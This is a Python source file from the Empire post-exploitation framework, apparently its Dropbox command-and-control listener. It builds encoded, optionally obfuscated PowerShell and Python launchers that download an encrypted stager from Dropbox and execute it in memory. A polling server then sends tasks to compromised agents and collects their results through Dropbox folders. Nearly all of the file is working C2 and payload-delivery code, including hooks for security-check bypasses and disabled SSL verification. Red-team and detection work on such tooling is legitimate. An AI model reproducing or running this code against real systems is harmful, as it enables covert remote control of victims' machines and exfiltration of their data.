import base64
import copy
import logging
import os
import time
from textwrap import dedent
from typing import List, Optional, Tuple

import dropbox

from empire.server.common import encryption, helpers, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util, log_util
from empire.server.utils.module_util import handle_validate_message

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "Dropbox",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": ("Starts a Dropbox listener."),
            "Category": ("third_party"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "dropbox",
            },
            "APIToken": {
                "Description": "Authorization token for Dropbox API communication.",
                "Required": True,
                "Value": "",
            },
            "PollInterval": {
                "Description": "Polling interval (in seconds) to communicate with the Dropbox Server.",
                "Required": True,
                "Value": "5",
            },
            "BaseFolder": {
                "Description": "The base Dropbox folder to use for comms.",
                "Required": True,
                "Value": "/Empire/",
            },
            "StagingFolder": {
                "Description": "The nested Dropbox staging folder.",
                "Required": True,
                "Value": "/staging/",
            },
            "TaskingsFolder": {
                "Description": "The nested Dropbox taskings folder.",
                "Required": True,
                "Value": "/taskings/",
            },
            "ResultsFolder": {
                "Description": "The nested Dropbox results folder.",
                "Required": True,
                "Value": "/results/",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 60,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 10,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.instance_log = log

    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        return ""

    def validate_options(self) -> Tuple[bool, Optional[str]]:
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                handle_validate_message(f'[!] Option "{key}" is required.')

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/dbx generate_launcher(): no language specified!")
            return None

        # Previously, we had to do a lookup for the listener and check through threads on the instance.
        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
        if (
            True
        ):  # The true check is just here to keep the indentation consistent with the old code.
            active_listener = self
            # extract the set options for this instantiated listener
            listenerOptions = active_listener.options

            # host = listenerOptions['Host']['Value']
            staging_key = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            api_token = listenerOptions["APIToken"]["Value"]
            baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
            staging_folder = "/{}/{}".format(
                baseFolder,
                listenerOptions["StagingFolder"]["Value"].strip("/"),
            )

            if language.startswith("po"):
                # PowerShell

                # replace with stager = '' for troubleshooting
                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if userAgent.lower() != "none" or proxy.lower() != "none":
                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += f"""
                                $proxy=New-Object Net.WebProxy;
                                $proxy.Address = '{ proxy.lower() }';
                                $wc.Proxy = $proxy;
                            """

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            domain = username.split("\\")[0]
                            usr = username.split("\\")[1]
                            stager += f"""
                                $netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');
                                $wc.Proxy.Credentials = $netcred;
                            """

                        # save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?

                # code to turn the key string into a byte array
                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                stager += dedent(
                    f"""
                    # add in the Dropbox auth token and API params
                    $t='{ api_token }';
                    $wc.Headers.Add("Authorization","Bearer $t");
                    $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');
                    $data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');
                    $iv=$data[0..3];$data=$data[4..$data.length];

                    # decode everything and kick it over to IEX to kick off execution
                    -join[Char[]](& $R $data ($IV+$K))|IEX
                    """
                )

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = self.mainMenu.obfuscationv2.obfuscate(
                        stager,
                        obfuscation_command=obfuscation_command,
                    )
                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            elif language.startswith("py"):
                launcherBase = "import sys;"
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += listener_util.python_safe_checks()
                except Exception as e:
                    p = f"Error setting LittleSnitch in stager: {str(e)}"
                    log.error(p)

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += dedent(
                    f"""
                    import urllib.request;
                    UA='{ userAgent }';
                    t='{ api_token }';
                    server='https://content.dropboxapi.com/2/files/download';
                    req=urllib.request.Request(server);
                    req.add_header('User-Agent',UA);
                    req.add_header("Authorization","Bearer "+t);
                    req.add_header("Dropbox-API-Arg",'{{"path":"{ staging_folder }/debugpy"}}');
                    """
                )

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += dedent(
                                f"""
                                proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            """
                            )
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                launcherBase += "a=urllib.request.urlopen(req).read();\n"

                # RC4 decryption
                launcherBase += listener_util.python_extract_stager(staging_key)

                if obfuscate:
                    launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                        launcherBase
                    )
                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
                        launcherBase
                    )

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
                        % (launchEncoded)
                    )
                    return launcher
                else:
                    return launcherBase

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            log.error("listeners/dbx generate_stager(): no language specified!")
            return None

        pollInterval = listenerOptions["PollInterval"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        api_token = listenerOptions["APIToken"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        stagingFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["StagingFolder"]["Value"].strip("/"),
        )
        taskingsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dropbox/dropbox.ps1")

            template_options = {
                "api_token": api_token,
                "tasking_folder": taskingsFolder,
                "results_folder": resultsFolder,
                "staging_folder": stagingFolder,
                "poll_interval": pollInterval,
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
            }

            stager = template.render(template_options)
            stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey.encode("UTF-8"),
                    stager.encode("UTF-8"),
                )
            else:
                # otherwise just return the case-randomized stager
                return stager

        elif language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dropbox/dropbox.py")

            template_options = {
                "api_token": api_token,
                "tasking_folder": taskingsFolder,
                "results_folder": resultsFolder,
                "staging_folder": stagingFolder,
                "poll_interval": pollInterval,
                "working_hours": workingHours,
                "staging_key": stagingKey,
                "profile": profile,
            }

            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                )
            else:
                # otherwise return the standard stager
                return stager

        else:
            log.error(
                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
            )

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            log.error("listeners/dbx generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + b64DefaultResponse.decode("UTF-8") + '"',
            )

            code = code.replace("REPLACE_COMMS", "")

            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)

            return code

        elif language == "python":
            if version == "ironpython":
                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
            else:
                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch some more
            code = code.replace("delay = 60", "delay = %s" % (delay))
            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                'profile = "%s"' % (profile),
            )
            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                'defaultResponse = base64.b64decode("%s")'
                % (b64DefaultResponse.decode("UTF-8")),
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace(
                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
                )

            code = code.replace("REPLACE_COMMS", "")

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)

            return code
        else:
            log.error(
                "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        api_token = listenerOptions["APIToken"]["Value"]

        taskingsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("dropbox/comms.ps1")

                template_options = {
                    "api_token": api_token,
                    "tasking_folder": taskingsFolder,
                    "results_folder": resultsFolder,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("dropbox/comms.py")

                template_options = {
                    "api_token": api_token,
                    "taskings_folder": taskingsFolder,
                    "results_folder": resultsFolder,
                }

                comms = template.render(template_options)
                return comms

            else:
                log.error(
                    "listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                )
        else:
            log.error("listeners/dbx generate_comms(): no language specified!")

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up polling server for Dropbox
        polling communication.

        ./Empire/
            ./staging/
                stager.ps1
                SESSION_[1-4].txt
            ./taskings/
                SESSIONID.txt
            ./results/
                SESSIONID.txt

        /Empire/staging/stager.ps1       -> RC4staging(stager.ps1) uploaded by server
        /Empire/staging/sessionID_1.txt  -> AESstaging(PublicKey) uploaded by client
        /Empire/staging/sessionID_2.txt  -> RSA(nonce+AESsession) uploaded by server
        /Empire/staging/sessionID_3.txt  -> AESsession(nonce+sysinfo) uploaded by client
        /Empire/staging/sessionID_4.txt  -> AESsession(agent.ps1) uploaded by server


        client                                              dropbox                             server
                                                                                        <- upload /Empire/staging/stager.ps1
        read /Empire/staging/stager                     ->
                                                        <-  return stager
        generate sessionID
        upload /Empire/staging/sessionID_1.txt          ->
                                                                                        <- read /Empire/staging/sessionID_1.txt
                                                                                        <- upload /Empire/staging/sessionID_2.txt
        read /Empire/staging/sessionID_2.txt            ->
                                                        <- /Empire/staging/sessionID_2.txt
        upload /Empire/staging/sessionID_3.txt          ->
                                                                                        <- read /Empire/staging/sessionID_3.txt
                                                                                        <- upload /Empire/staging/sessionID_4.txt
        read /Empire/staging/sessionID_4.txt            ->
                                                        <- /Empire/staging/sessionID_4.txt

        <start beaconing>
                                                                                        <- upload /Empire/taskings/sessionID.txt
        read /Empire/taskings/sessionID.txt             ->
                                                        <- /Empire/taskings/sessionID.txt
        delete /Empire/taskings/sessionID.txt           ->

        execute code
        upload /Empire/results/sessionID.txt            ->
                                                                                        <- read /Empire/results/sessionID.txt
                                                                                        <- delete /Empire/results/sessionID.txt

        """
        self.instance_log = log_util.get_listener_logger(
            LOG_NAME_PREFIX, self.options["Name"]["Value"]
        )

        def download_file(dbx, path):
            # helper to download a file at the given path
            try:
                md, res = dbx.files_download(path)
            except dropbox.exceptions.HttpError as err:
                listenerName = self.options["Name"]["Value"]
                message = (
                    f"{listenerName}: Error downloading data from '{path}' : {err}"
                )
                self.instance_log.error(message, exc_info=True)

                return None
            return res.content

        def upload_file(dbx, path, data):
            # helper to upload a file to the given path
            try:
                dbx.files_upload(data, path)
            except dropbox.exceptions.ApiError:
                listenerName = self.options["Name"]["Value"]
                message = f"{listenerName}: Error uploading data to '{path}'"
                self.instance_log.error(message, exc_info=True)

        def delete_file(dbx, path):
            # helper to delete a file at the given path
            try:
                dbx.files_delete(path)
            except dropbox.exceptions.ApiError:
                listenerName = self.options["Name"]["Value"]
                message = f"{listenerName} Error deleting data at '{path}'"
                self.instance_log.error(message, exc_info=True)

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        stagingKey = listenerOptions["StagingKey"]["Value"]
        pollInterval = listenerOptions["PollInterval"]["Value"]
        api_token = listenerOptions["APIToken"]["Value"]
        listenerName = listenerOptions["Name"]["Value"]
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        stagingFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["StagingFolder"]["Value"].strip("/"),
        )
        taskingsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/{}/{}".format(
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        dbx = dropbox.Dropbox(api_token)

        # ensure that the access token supplied is valid
        try:
            dbx.users_get_current_account()
        except dropbox.exceptions.AuthError:
            log.error(
                "ERROR: Invalid access token; try re-generating an access token from the app console on the web.",
                exc_info=True,
            )
            return False

        # setup the base folder structure we need
        try:
            dbx.files_create_folder(stagingFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: Dropbox folder '{stagingFolder}' already exists"
            self.instance_log.info(message)
        try:
            dbx.files_create_folder(taskingsFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = (
                f"{listenerName}: Dropbox folder '{taskingsFolder}' already exists"
            )
            self.instance_log.info(message)
        try:
            dbx.files_create_folder(resultsFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: Dropbox folder '{resultsFolder}' already exists"
            self.instance_log.info(message)

        # upload the stager.ps1 code
        stagerCodeps = self.generate_stager(
            listenerOptions=listenerOptions, language="powershell"
        )
        stagerCodepy = self.generate_stager(
            listenerOptions=listenerOptions, language="python"
        )
        try:
            # delete stager if it exists
            delete_file(dbx, "%s/debugps" % (stagingFolder))
            delete_file(dbx, "%s/debugpy" % (stagingFolder))
            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
        except dropbox.exceptions.ApiError:
            message = (
                f"{listenerName}: Error uploading stager to '{stagingFolder}/stager'"
            )
            self.instance_log.error(message, exc_info=True)
            return

        while True:
            time.sleep(int(pollInterval))

            # search for anything in /Empire/staging/*
            for match in dbx.files_search(stagingFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                relName = fileName.split("/")[-1][:-4]
                sessionID, stage = relName.split("_")
                sessionID = sessionID.upper()

                if "_" in relName:
                    if stage == "1":
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            listenerName = self.options["Name"]["Value"]
                            message = f"{listenerName}: Error downloading data from '{fileName}' : {err}"
                            self.instance_log.error(message, exc_info=True)
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(
                            stagingKey, stageData, listenerOptions
                        )
                        if dataResults and len(dataResults) > 0:
                            for _language, results in dataResults:
                                # TODO: more error checking
                                try:
                                    dbx.files_delete(fileName)
                                except dropbox.exceptions.ApiError:
                                    listenerName = self.options["Name"]["Value"]
                                    message = f"{listenerName}: Error deleting data at '{fileName}'"
                                    self.instance_log.error(message, exc_info=True)
                                try:
                                    stageName = f"{stagingFolder}/{sessionID}_2.txt"
                                    listenerName = self.options["Name"]["Value"]
                                    message = f"Uploading key negotiation part 2 to {stageName} for {sessionID}"
                                    self.instance_log.info(message)
                                    log.info(message)

                                    dbx.files_upload(results, stageName)
                                except dropbox.exceptions.ApiError:
                                    listenerName = self.options["Name"]["Value"]
                                    message = f"{listenerName}: Error uploading data to '{stageName}'"
                                    self.instance_log.error(message, exc_info=True)

                    if stage == "3":
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            listenerName = self.options["Name"]["Value"]
                            message = f"{listenerName}: Error downloading data from '{fileName}' : {err}"
                            self.instance_log.error(message, exc_info=True)
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(
                            stagingKey, stageData, listenerOptions
                        )
                        if dataResults and len(dataResults) > 0:
                            # print "dataResults:",dataResults
                            for language, results in dataResults:
                                if results.startswith("STAGE2"):
                                    sessionKey = self.mainMenu.agents.agents[sessionID][
                                        "sessionKey"
                                    ]
                                    listenerName = self.options["Name"]["Value"]
                                    message = f"{listenerName}: Sending agent (stage 2) to {sessionID} through Dropbox"
                                    self.instance_log.info(message)
                                    log.info(message)

                                    try:
                                        dbx.files_delete(fileName)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = f"{listenerName}: Error deleting data at '{fileName}'"
                                        self.instance_log.error(message, exc_info=True)

                                    try:
                                        fileName2 = fileName.replace(
                                            "%s_3.txt" % (sessionID),
                                            "%s_2.txt" % (sessionID),
                                        )
                                        dbx.files_delete(fileName2)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = f"{listenerName}: Error deleting data at '{fileName2}'"
                                        self.instance_log.error(message, exc_info=True)

                                    session_info = (
                                        SessionLocal()
                                        .query(models.Agent)
                                        .filter(models.Agent.session_id == sessionID)
                                        .first()
                                    )
                                    if session_info.language == "ironpython":
                                        version = "ironpython"
                                    else:
                                        version = ""

                                    # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                    agentCode = self.generate_agent(
                                        language=language,
                                        listenerOptions=listenerOptions,
                                        version=version,
                                    )

                                    if language.lower() in ["python", "ironpython"]:
                                        sessionKey = bytes.fromhex(sessionKey)

                                    returnResults = encryption.aes_encrypt_then_hmac(
                                        sessionKey, agentCode
                                    )

                                    try:
                                        stageName = f"{stagingFolder}/{sessionID}_4.txt"
                                        listenerName = self.options["Name"]["Value"]
                                        message = f"{listenerName}: Uploading key negotiation part 4 (agent) to {stageName} for {sessionID}"
                                        self.instance_log.info(message)
                                        log.info(message)
                                        dbx.files_upload(returnResults, stageName)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = f"{listenerName}: Error uploading data to '{stageName}'"
                                        self.instance_log.error(message, exc_info=True)

            # get any taskings applicable for agents linked to this listener
            sessionIDs = self.mainMenu.agents.get_agents_for_listener(listenerName)

            for sessionID in sessionIDs:
                taskingData = self.mainMenu.agents.handle_agent_request(
                    sessionID, "powershell", stagingKey
                )
                if taskingData:
                    try:
                        taskingFile = f"{taskingsFolder}/{sessionID}.txt"

                        # if the tasking file still exists, download/append + upload again
                        existingData = None
                        try:
                            md, res = dbx.files_download(taskingFile)
                            existingData = res.content
                        except Exception:
                            existingData = None

                        if existingData:
                            taskingData = taskingData + existingData

                        listenerName = self.options["Name"]["Value"]
                        message = f"{listenerName}: Uploading agent tasks for {sessionID} to {taskingFile}"
                        self.instance_log.info(message)

                        dbx.files_upload(
                            taskingData,
                            taskingFile,
                            mode=dropbox.files.WriteMode.overwrite,
                        )
                    except dropbox.exceptions.ApiError as e:
                        listenerName = self.options["Name"]["Value"]
                        message = f"{listenerName} Error uploading agent tasks for {sessionID} to {taskingFile} : {e}"
                        self.instance_log.error(message, exc_info=True)
                        log.error(message, exc_info=True)

            # check for any results returned
            for match in dbx.files_search(resultsFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                sessionID = fileName.split("/")[-1][:-4]

                listenerName = self.options["Name"]["Value"]
                message = (
                    f"{listenerName} Downloading data for '{sessionID}' from {fileName}"
                )
                self.instance_log.info(message)

                try:
                    md, res = dbx.files_download(fileName)
                except dropbox.exceptions.HttpError as err:
                    listenerName = self.options["Name"]["Value"]
                    message = (
                        f"{listenerName}: Error download data from '{fileName}' : {err}"
                    )
                    self.instance_log.error(message, exc_info=True)
                    log.error(message, exc_info=True)
                    continue

                responseData = res.content

                try:
                    dbx.files_delete(fileName)
                except dropbox.exceptions.ApiError:
                    listenerName = self.options["Name"]["Value"]
                    message = f"{listenerName} Error deleting data at '{fileName}'"
                    self.instance_log.error(message, exc_info=True)
                    log.error(message, exc_info=True)

                self.mainMenu.agents.handle_agent_data(
                    stagingKey, responseData, listenerOptions
                )

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != "":
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions["Name"]["Value"]
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """
        if name and name != "":
            to_kill = name
        else:
            to_kill = self.options["Name"]["Value"]

        self.instance_log.info(f"{to_kill}: shutting down...")
        log.info(f"{to_kill}: shutting down...")
        self.threads[to_kill].kill()
